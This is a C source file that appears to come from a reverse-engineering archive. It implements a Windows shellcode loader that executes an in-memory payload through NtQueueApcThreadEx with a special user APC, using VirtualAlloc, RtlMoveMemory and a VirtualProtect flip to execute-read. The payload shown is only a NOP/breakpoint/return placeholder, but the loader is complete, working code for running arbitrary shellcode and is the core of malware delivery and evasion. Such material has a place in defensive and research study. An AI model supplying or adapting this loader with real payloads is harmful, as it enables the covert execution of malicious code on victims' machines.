/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode using APC.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  NtQueueApcThreadEx + NtTestAlert
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
typedef enum _QUEUE_USER_APC_FLAGS {
	QueueUserApcFlagsNone,
	QueueUserApcFlagsSpecialUserApc,
	QueueUserApcFlagsMaxValue
} QUEUE_USER_APC_FLAGS;

typedef union _USER_APC_OPTION {
	ULONG_PTR UserApcFlags;
	HANDLE MemoryReserveHandle;
} USER_APC_OPTION, *PUSER_APC_OPTION;


/* ========= function signatures ========= */
typedef VOID (*PPS_APC_ROUTINE) (LPVOID, LPVOID, LPVOID);

typedef NTSTATUS NTAPI NtQueueApcThreadEx_t (HANDLE, USER_APC_OPTION, PPS_APC_ROUTINE, PVOID, PVOID, PVOID);
typedef NtQueueApcThreadEx_t FAR * pNtQueueApcThreadEx;

typedef NTSTATUS NTAPI NtTestAlert_t ();
typedef NtTestAlert_t FAR * pNtTestAlert;

/* ========= helper functions ========= */


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;
    USER_APC_OPTION option;

    // function pointer to internal API
    pNtQueueApcThreadEx NtQueueApcThreadEx;
    pNtTestAlert        NtTestAlert;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    NtQueueApcThreadEx  = (pNtQueueApcThreadEx) GetProcAddress(ntdll, "NtQueueApcThreadEx");
    NtTestAlert         = (pNtTestAlert) GetProcAddress(ntdll, "NtTestAlert");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        option.UserApcFlags = QueueUserApcFlagsSpecialUserApc;
        NtQueueApcThreadEx (GetCurrentThread(), option, (PPS_APC_ROUTINE)runtime, NULL, NULL, NULL);
        Sleep(500);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}